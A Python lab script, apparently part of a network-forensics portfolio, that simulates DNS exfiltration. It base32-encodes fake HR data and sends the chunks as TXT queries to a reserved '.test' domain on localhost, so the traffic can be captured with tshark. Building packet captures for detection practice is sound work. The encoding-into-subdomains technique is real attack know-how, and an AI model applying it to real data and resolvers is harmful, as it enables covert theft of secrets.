#!/usr/bin/env python3
"""dns-exfil-sim.py: SAFE simulation of DNS exfiltration for case 04.

What it does: takes a (fake) secret, base32-encodes it, cuts it into chunks,
and sends each chunk as a DNS query like
    <seq>.<chunk>.exfil.test
to 127.0.0.1 (your own Mac). Nothing leaves your machine:
  * the destination is localhost, not a real DNS resolver
  * ".test" is a TLD reserved for testing (RFC 2606) and never exists on the internet
Nothing needs to answer the queries: we only want to *capture* them.

Capture it (in a second terminal, before running this):
    tshark -i lo0 -f "udp port 53" -w ~/pcap-work/04-dns-exfil/dns-exfil.pcapng

Run:
    python3 tools/dns-exfil-sim.py                 # sends built-in fake data
    python3 tools/dns-exfil-sim.py --noise         # also mixes in normal-looking lookups

Why base32? DNS names allow only letters, digits and hyphens, and aren't case-sensitive,
so real tools (iodine, dnscat2) use base32-style encodings. A label can be at most 63 chars.
"""
import argparse
import base64
import random
import socket
import struct
import time

# ~50 rows of obviously fake "HR data" -> roughly 80 DNS queries
FAKE_SECRET = "CONFIDENTIAL - FAKE TEST DATA FOR A PORTFOLIO LAB\nemployee_id,name,salary\n" + "".join(
    f"{1000 + i},Test User {i},{30000 + i * 250}\n" for i in range(50)
)
NORMAL = ["www.example.com", "mail.example.org", "www.example.net", "cdn.example.com"]


def build_query(name: str, qid: int, qtype: int = 1) -> bytes:
    """Build a minimal DNS query packet by hand (shows what a DNS packet contains)."""
    header = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)  # id, flags=recursion desired, 1 question
    qname = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
    return header + qname + struct.pack(">HH", qtype, 1)  # type (1=A, 16=TXT), class IN


def chunks(data: bytes, size: int):
    enc = base64.b32encode(data).decode().rstrip("=").lower()
    return [enc[i:i + size] for i in range(0, len(enc), size)]


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--domain", default="exfil.test")
    ap.add_argument("--server", default="127.0.0.1")
    ap.add_argument("--chunk", type=int, default=50, help="chars per label (max 63)")
    ap.add_argument("--delay", type=float, default=0.5, help="seconds between queries")
    ap.add_argument("--noise", action="store_true", help="mix in normal lookups")
    a = ap.parse_args()
    assert a.chunk <= 63, "DNS labels can't exceed 63 characters"
    assert a.domain.endswith(".test"), "use a reserved .test domain so nothing reaches the internet"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    parts = chunks(FAKE_SECRET.encode(), a.chunk)
    for seq, part in enumerate(parts):
        name = f"{seq:04d}.{part}.{a.domain}"
        sock.sendto(build_query(name, random.randint(0, 0xFFFF), qtype=16), (a.server, 53))
        print(f"sent {name}")
        if a.noise and seq % 3 == 0:
            sock.sendto(build_query(random.choice(NORMAL), random.randint(0, 0xFFFF)), (a.server, 53))
        time.sleep(a.delay)
    print(f"done: {len(parts)} exfil queries")


if __name__ == "__main__":
    main()
